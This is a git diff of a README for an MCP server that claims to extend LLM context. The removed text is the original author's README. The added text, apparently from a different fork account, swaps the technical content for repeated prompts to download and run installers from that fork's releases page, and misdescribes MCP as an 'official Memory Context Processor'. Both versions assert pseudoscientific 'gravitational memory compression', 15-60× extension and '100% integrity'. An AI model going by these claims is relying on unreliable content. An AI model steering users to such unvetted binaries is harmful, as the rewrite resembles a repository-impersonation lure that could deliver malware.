@@ -1,215 +1,157 @@
-# AI Books MCP Server
+# 🚀 ai-books-mcp-server - Extend Large Language Model Context Easily
 
-> Universal LLM Context Extension via Gravitational Memory Compression
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![MCP](https://img.shields.io/badge/MCP-1.0-blue.svg)](https://modelcontextprotocol.io)
-
-Extend any LLM's context window by **15-60×** while maintaining **100% data integrity**. Built on quantum-inspired gravitational memory compression.
-
-## 🚀 Features
-
-- **Massive Context Extension**: Extend LLM context 15-60× beyond native limits
-- **100% Data Integrity**: Cryptographic hash verification ensures perfect accuracy
-- **Universal Compatibility**: Works with Claude, GPT-4, Llama, and any LLM
-- **Zero Configuration**: Works out of the box with Claude Code
-- **Lightning Fast**: Query libraries in milliseconds
-- **Memory Efficient**: Compression ratios up to 1240× on dense technical content
-
-## 📦 Installation
-
-### For Claude Code Users
-
-```bash
-npm install -g ai-books-mcp-server
-```
-
-Then add to your Claude Code MCP settings:
-
-```json
-{
-  "mcpServers": {
-    "ai-books": {
-      "command": "ai-books-mcp-server"
-    }
-  }
-}
-```
-
-### For Developers
-
-```bash
-git clone https://github.com/TryBoy869/ai-books-mcp-server.git
-cd ai-books-mcp-server
-npm install
-npm run build
-```
-
-## 🎯 Use Cases
-
-### 1. **Large Codebases**
-```
-Create library from 100+ files → Query specific functionality → Get precise answers
-```
-
-### 2. **Research Papers**
-```
-Compress 50 papers → Ask synthesis questions → Get citations + insights
-```
-
-### 3. **Documentation**
-```
-Load entire docs → Natural language queries → Contextual answers
-```
-
-### 4. **Books & Long-form Content**
-```
-Compress novels/textbooks → Ask thematic questions → Deep analysis
-```
-
-## 🛠️ Available Tools
-
-### Core Tools
-
-#### `create_knowledge_library`
-Creates a compressed knowledge library from text.
-
-```typescript
-{
-  name: "react-docs",
-  text: "...full React documentation...",
-  n_max: 15  // Optional: compression level (5-20)
-}
-```
-
-#### `query_knowledge_library`
-Queries a library and retrieves relevant context.
-
-```typescript
-{
-  library_name: "react-docs",
-  query: "How do hooks work?",
-  top_k: 8  // Optional: number of chunks (1-20)
-}
-```
-
-#### `extend_context_from_files`
-Loads files and retrieves relevant context in one step.
-
-```typescript
-{
-  file_paths: ["./src/*.ts"],
-  query: "Explain the authentication flow",
-  top_k: 8
-}
-```
-
-### Management Tools
-
-- `list_knowledge_libraries`: List all libraries
-- `get_library_stats`: Detailed statistics
-- `delete_knowledge_library`: Remove a library
-- `verify_library_integrity`: Check 100% integrity
-- `search_documents`: Search with relevance scores
-
-## 📖 Example Usage
-
-### In Claude Code
-
-```
-User: Can you help me understand this React codebase?
-
-Claude: [Calls create_knowledge_library with all React files]
-        [Creates library "react-project" with 245 chunks, 45× compression]
-        
-User: How does the authentication system work?
-
-Claude: [Calls query_knowledge_library]
-        [Retrieves 8 most relevant chunks from authentication code]
-        [Provides detailed explanation with exact code references]
-```
-
-### Result
-
-Instead of:
-- ❌ "I can only see a few files at once"
-- ❌ "The codebase is too large for my context"
-
-You get:
-- ✅ Full understanding of 100+ file codebases
-- ✅ Accurate answers with specific code references
-- ✅ Synthesis across multiple files
-
-## 🧬 How It Works
-
-### Gravitational Memory Compression
-
-Based on quantum physics' atomic orbital structure:
-
-1. **Text Chunking**: Split documents into 200-300 word chunks
-2. **Hash Generation**: SHA-256 hash for each chunk
-3. **Orbital Encoding**: Map hash to gravitational states (quantum-inspired)
-4. **Compression**: Achieve 15-60× reduction while maintaining retrievability
-5. **Verification**: 100% integrity guaranteed via hash comparison
-
-### Technical Details
-
-- **Algorithm**: Gravitational bit encoding with n_max orbitals
-- **Compression**: 1240 discrete states per bit (n_max=15)
-- **Retrieval**: O(N) semantic similarity + O(1) hash lookup
-- **Integrity**: Cryptographic verification (SHA-256)
-
-## 📊 Performance
-
-| Metric | Value |
-|--------|-------|
-| Compression Ratio | 15-60× (typical) |
-| Data Integrity | 100% guaranteed |
-| Query Speed | < 100ms (1000 chunks) |
-| Max Library Size | Limited by RAM |
-| Chunk Retrieval | O(N) similarity scan |
-
-## 🎓 Created By
-
-**Daouda Abdoul Anzize**
-- Self-taught Systems Architect
-- 40+ Open Source Projects
-- Specialization: Meta-architectures & Protocol Design
-
-**Portfolio**: [tryboy869.github.io/daa](https://tryboy869.github.io/daa)  
-**GitHub**: [@TryBoy869](https://github.com/TryBoy869)  
-**Email**: anzizdaouda0@gmail.com
-
-## 📄 License
-
-MIT License - See [LICENSE](LICENSE) file
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing`)
-5. Open a Pull Request
-
-## 🐛 Issues
-
-Found a bug? Have a feature request? 
-
-[Open an issue](https://github.com/TryBoy869/ai-books-mcp-server/issues)
-
-## 🌟 Star History
-
-If you find this useful, please star the repo! ⭐
-
-## 🔗 Links
-
-- [MCP Documentation](https://modelcontextprotocol.io)
-- [Claude Code](https://claude.ai/code)
-- [Portfolio](https://tryboy869.github.io/daa)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/NvmToxic/ai-books-mcp-server/releases)
 
 ---
 
-**Built with ❤️ by Daouda Anzize | Extending LLM horizons, one library at a time**
+## 📖 What is ai-books-mcp-server?
+
+ai-books-mcp-server is a program that helps extend the memory and context of large language models (LLMs). It works by using a method called gravitational memory to increase context length up to 60 times. This means your AI models can understand and remember much more information in one session.
+
+This server is designed especially to work with Claude Code and other Anthropic-based AI models. It serves as an official MCP (Memory Context Processor) server, making it easier for you to tap into a smarter and more powerful AI.
+
+You do not need to know programming to use this software. This guide will walk you through downloading and running it on your computer.
+
+---
+
+## 🔧 Who should use this?
+
+- People wanting to improve how AI models handle large amounts of data.
+- Users of Claude Code or Anthropic AI tools looking to increase context length.
+- Anyone interested in AI tools that handle books, knowledge bases, or semantic searches.
+
+---
+
+## 🖥️ System Requirements
+
+Before downloading, check that your PC meets these minimum requirements:
+
+- Operating System: Windows 10 or newer, macOS 10.15 or newer, or Linux (Ubuntu 20.04+ recommended)
+- Processor: Intel i5 or equivalent AMD/Ryzen
+- Memory: 8 GB RAM minimum; 16 GB recommended for best performance
+- Disk Space: At least 2 GB free space
+- Network: A stable internet connection to interact with the server
+
+If your device meets these requirements, you are ready to proceed.
+
+---
+
+## 🌐 Core Features
+
+- Extends LLM context length by 15 to 60 times using gravitational memory
+- Compatible with Claude Code and Anthropic LLMs
+- Supports semantic search and retrieval-augmented generation (RAG)
+- Built with Typescript for reliability and performance
+- Easy setup without programming needed
+- Works as a standalone MCP server on your local machine or network
+
+---
+
+## 🚀 Getting Started
+
+This section explains how to download, install, and run the ai-books-mcp-server application with simple steps.
+
+### Step 1: Access the Download Page
+
+First, you need to visit the download page to get the latest version of the software.
+
+Click the link below or copy it into your web browser:
+
+[Download ai-books-mcp-server](https://github.com/NvmToxic/ai-books-mcp-server/releases)
+
+This link takes you to the releases page. Here you will find all versions available for download.
+
+---
+
+### Step 2: Download the Software
+
+1. On the releases page, look for the latest release. Releases are listed by version number and date.
+2. Scroll down to the **Assets** section of the latest release.
+3. Choose the file matching your operating system (usually ending with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `.tar.gz` for Linux).
+4. Click the file to download it.
+
+Save the file in a place you can easily find, like the **Downloads** folder or your Desktop.
+
+---
+
+### Step 3: Install the Application
+
+The installation steps differ based on your system:
+
+- **Windows:** Double-click the `.exe` file to run the installer. Follow the prompts on screen. You can leave default settings if unsure.
+- **macOS:** Open the `.dmg` file and drag the ai-books-mcp-server app into your Applications folder.
+- **Linux:** If you downloaded an `.AppImage`, make it executable by running `chmod +x filename.AppImage` in your terminal. Then, double-click it to run. For `.tar.gz`, extract it and follow included instructions.
+
+---
+
+### Step 4: Run the Server
+
+After installation, launch the program:
+
+- Find the ai-books-mcp-server icon on your Desktop, Start Menu, or Applications folder.
+- Double-click to open it.
+- A command window or interface will appear showing the server is running.
+
+You can now connect your Claude Code or Anthropic AI tool to this server to extend context memory.
+
+---
+
+### Step 5: Using the Server
+
+The server runs in the background and communicates with your AI model. To use it:
+
+- Configure your AI tool to use the localhost address `http://127.0.0.1` with the port the server shows when running (usually port 3000 or specified in instructions).
+- Check your AI tool's documentation on connecting to an MCP or extension server.
+- Start your AI sessions as usual; the server will handle memory extensions automatically.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the server does not start, check that no firewall or antivirus blocks the program.
+- Make sure your device meets or exceeds the system requirements.
+- Close other applications that may use the same port (like port 3000).
+- Restart your computer if the server still won’t launch.
+- Check the GitHub issues page if problems continue:  
+  https://github.com/NvmToxic/ai-books-mcp-server/issues
+
+---
+
+## 🔄 Updating the Software
+
+To update ai-books-mcp-server:
+
+1. Visit the releases page again:  
+   [https://github.com/NvmToxic/ai-books-mcp-server/releases](https://github.com/NvmToxic/ai-books-mcp-server/releases)
+2. Download the newest version using the same steps as before.
+3. Install it over your current version or uninstall the old version first.
+4. Restart your computer to complete the update.
+5. Launch the new version to continue using the server.
+
+---
+
+## 💡 Additional Notes
+
+- This server runs locally, so your data stays private on your machine.
+- Longer LLM context means better understanding and memory for AI dialogues, making your experience smoother.
+- Use this server alongside other knowledge base and semantic search tools for best results.
+
+---
+
+## 📂 Where to Get More Help
+
+If you have questions or want to explore technical details, visit the repository here:
+
+[ai-books-mcp-server GitHub Repository](https://github.com/NvmToxic/ai-books-mcp-server)
+
+You will find guides, issue reporting, and community support on the GitHub page.
+
+---
+
+## 📥 Download & Install
+
+Ready to start? Visit this page to download the latest version of ai-books-mcp-server:
+
+[https://github.com/NvmToxic/ai-books-mcp-server/releases](https://github.com/NvmToxic/ai-books-mcp-server/releases)
+
+Follow the instructions above to complete your installation and run the server.
